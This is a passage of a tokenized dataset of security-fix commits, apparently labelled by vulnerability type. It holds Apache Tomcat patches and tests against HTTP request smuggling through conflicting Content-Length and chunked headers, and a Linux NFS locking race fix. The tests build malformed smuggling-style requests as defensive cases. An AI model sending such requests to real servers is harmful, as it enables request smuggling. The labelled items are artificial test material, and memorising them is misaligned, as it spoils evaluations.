"this", "point", "indicates", "that", "/", "/", "chunked", "encoding", "is", "being", "used", "but", "chunked", "encoding", "should", "/", "/", "not", "be", "used", "with", "a", "content", "length", ".", "RFC", "2616", ",", "section", "4", ".", "4", ",", "/", "/", "bullet", "3", "states", "Content", "-", "Length", "must", "be", "ignored", "in", "this", "case", "-", "/", "/", "so", "remove", "it", ".", "headers", ".", "removeHeader", "(", "\"", "content", "-", "length", "\"", ");", "request", ".", "setContentLength", "(", "-", "1", ")", ";", "}", "else", "{", "getInputBuffer", "(", ").", "addActiveFilter", "(", "inputFilters", "[", "Constants", ".", "IDENTITY_FILTER", "]", ");", "contentDelimitation", "=", "true", ";", "}", "}", "MessageBytes", "valueMB", "=", "headers", ".", "getValue", "(", "\"", "host", "\"", ");", "@", "@", "-", "98", ",", "9", "+", "98", ",", "20", "@", "@", "public", "void", "testKeepAlive", "(", ")", "throws", "Exception", "{", "ajpClient", ".", "disconnect", "(", ");", "}", "@", "Test", "public", "void", "testPost", "(", ")", "throws", "Exception", "{", "doTestPost", "(", "false", ",", "HttpServletResponse", ".", "SC_OK", ")", ";", "}", "@", "Test", "public", "void", "testSimplePost", "(", ")", "throws", "Exception", "{", "public", "void", "testPostMultipleContentLength", "(", ")", "throws", "Exception", "{", "/", "/", "Multiple", "content", "lengths", "doTestPost", "(", "true", ",", "HttpServletResponse", ".", "SC_BAD_REQUEST", ")", ";", "}", "public", "void", "doTestPost", "(", "boolean", "multipleCL", ",", "int", "expectedStatus", ")", "throws", "Exception", "{", "Tomcat", "tomcat", "=", "getTomcatInstance", "(", ");", "@", "@", "-", "119", ",", "6", "+", "130", ",", "9", "@", "@", "public", "void", "testSimplePost", "(", ")", "throws", "Exception", "{", "TesterAjpMessage", "forwardMessage", "=", "ajpClient", ".", "createForwardMessage", "(", "\"/", "echo", "-", "params", ".", "jsp", "\"", ",", "4", ")", ";", "forwardMessage", ".", "addHeader", "(", "0xA008", ",", "\"", "9", "\"", ");", "if", "(", "multipleCL", ")", "{", "forwardMessage", ".", "addHeader", "(", "0xA008", ",", "\"", "99", "\"", ");", "}", "forwardMessage", ".", "addHeader", "(", "0xA007", ",", "\"", "application", "/", "x", "-", "www", "-", "form", "-", "urlencoded", "\"", ");", "forwardMessage", ".", "end", "(", ");", "@", "@", "-", "128", ",", "15", "+", "142", ",", "20", "@", "@", "public", "void", "testSimplePost", "(", ")", "throws", "Exception", "{", "TesterAjpMessage", "responseHeaders", "=", "ajpClient", ".", "sendMessage", "(", "forwardMessage", ",", "bodyMessage", ")", ";", "/", "/", "Expect", "3", "messages", ":", "headers", ",", "body", ",", "end", "validateResponseHeaders", "(", "responseHeaders", ",", "200", ")", ";", "/", "/", "Skip", "the", "body", "TesterAjpMessage", "responseBody", "=", "ajpClient", ".", "readMessage", "(", ");", "validateResponseBody", "(", "responseBody", ",", "\"", "test", "-", "data", "\"", ");", "validateResponseEnd", "(", "ajpClient", ".", "readMessage", "(", "),", "true", ")", ";", "validateResponseHeaders", "(", "responseHeaders", ",", "expectedStatus", ")", ";", "if", "(", "expectedStatus", "=", "=", "HttpServletResponse", ".", "SC_OK", ")", "{", "/", "/", "Expect", "3", "messages", ":", "headers", ",", "body", ",", "end", "for", "a", "valid", "request", "TesterAjpMessage", "responseBody", "=", "ajpClient", ".", "readMessage", "(", ");", "validateResponseBody", "(", "responseBody", ",", "\"", "test", "-", "data", "\"", ");", "validateResponseEnd", "(", "ajpClient", ".", "readMessage", "(", "),", "true", ")", ";", "/", "/", "Double", "check", "the", "connection", "is", "still", "open", "validateCpong", "(", "ajpClient", ".", "cping", "(", "))", ";", "}", "else", "{", "/", "/", "Expect", "2", "messages", ":", "headers", ",", "end", "for", "an", "invalid", "request", "validateResponseEnd", "(", "ajpClient", ".", "readMessage", "(", "),", "false", ")", ";", "}", "/", "/", "Double", "check", "the", "connection", "is", "still", "open", "validateCpong", "(", "ajpClient", ".", "cping", "(", "))", ";", "ajpClient", ".", "disconnect", "(", ");", "}", "@", "@", "-", "103", ",", "6", "+", "103", ",", "20", "@", "@", "public", "void", "testWithTEBuffered", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testWithTEChunked", "(", ")", "throws", "Exception", "{", "doTestWithTEChunked", "(", "false", ")", ";", "}", "@", "Test", "public", "void", "testWithTEChunkedWithCL", "(", ")", "throws", "Exception", "{", "/", "/", "Should", "be", "ignored", "doTestWithTEChunked", "(", "true", ")", ";", "}", "private", "void", "doTestWithTEChunked", "(", "boolean", "withCL", ")", "throws", "Exception", "{", "Tomcat", "tomcat", "=", "getTomcatInstance", "(", ");", "/", "/", "Use", "the", "normal", "Tomcat", "ROOT", "context", "@", "@", "-", "114", ",", "6", "+", "128", ",", "7", "@", "@", "public", "void", "testWithTEChunked", "(", ")", "throws", "Exception", "{", "String", "request", "=", "\"", "POST", "/", "echo", "-", "params", ".", "jsp", "HTTP", "/", "1", ".", "1", "\"", "+", "SimpleHttpClient", ".", "CRLF", "+", "\"", "Host", ":", "any", "\"", "+", "SimpleHttpClient", ".", "CRLF", "+", "(", "withCL", "?", "\"", "Content", "-", "length", ":", "1", "\"", "+", "SimpleHttpClient", ".", "CRLF", ":", "\"", "\")", "\"", "Transfer", "-", "encoding", ":", "chunked", "\"", "+", "SimpleHttpClient", ".", "CRLF", "+", "\"", "Content", "-", "Type", ":", "application", "/", "x", "-", "www", "-", "form", "-", "urlencoded", "\"", "+", "SimpleHttpClient", ".", "CRLF", "+"], "docstring_tokens": ["http", "request", "smuggling"]}
{"contents": ["NFS:", "Remove", "the", "buggy", "lock-if-signalled", "case", "from", "do_setlk()", "Both", "NLM", "and", "NFSv4", "should", "be", "able", "to", "clean", "up", "adequately", "in", "the", "case", "where", "the", "user", "interrupts", "the", "RPC", "call...", "Signed-off-by:", "Trond", "Myklebust", "<Trond.Myklebust@netapp.com>"], "code_tokens": ["@", "@", "-", "566", ",", "17", "+", "566", ",", "9", "@", "@", "static", "int", "do_setlk", "(", "struct", "file", "*", "filp", ",", "int", "cmd", ",", "struct", "file_lock", "*", "fl", ")", "lock_kernel", "(", ");", "/", "*", "Use", "local", "locking", "if", "mounted", "with", "\"", "-", "onolock", "\"", "*", "/", "if", "(", "!(", "NFS_SERVER", "(", "inode", ")", "->", "flags", "&", "NFS_MOUNT_NONLM", ")", ")", "{", "if", "(", "!(", "NFS_SERVER", "(", "inode", ")", "->", "flags", "&", "NFS_MOUNT_NONLM", ")", ")", "status", "=", "NFS_PROTO", "(", "inode", ")", "->", "lock", "(", "filp", ",", "cmd", ",", "fl", ")", ";", "/", "*", "If", "we", "were", "signalled", "we", "still", "need", "to", "ensure", "that", "*", "we", "clean", "up", "any", "state", "on", "the", "server", ".", "We", "therefore", "*", "record", "the", "lock", "call", "as", "having", "succeeded", "in", "order", "to", "*", "ensure", "that", "locks_remove_posix", "(", ")", "cleans", "it", "out", "when", "*", "the", "process", "exits", ".", "*", "/", "if", "(", "status", "=", "=", "-", "EINTR", "|", "|", "status", "=", "=", "-", "ERESTARTSYS", ")", "do_vfs_lock", "(", "filp", ",", "fl", ")", ";", "}", "else", "else", "status", "=", "do_vfs_lock", "(", "filp", ",", "fl", ")", ";", "unlock_kernel", "(", ");", "if", "(", "status", "<", "0", ")"], "docstring_tokens": ["race", "condition"]}
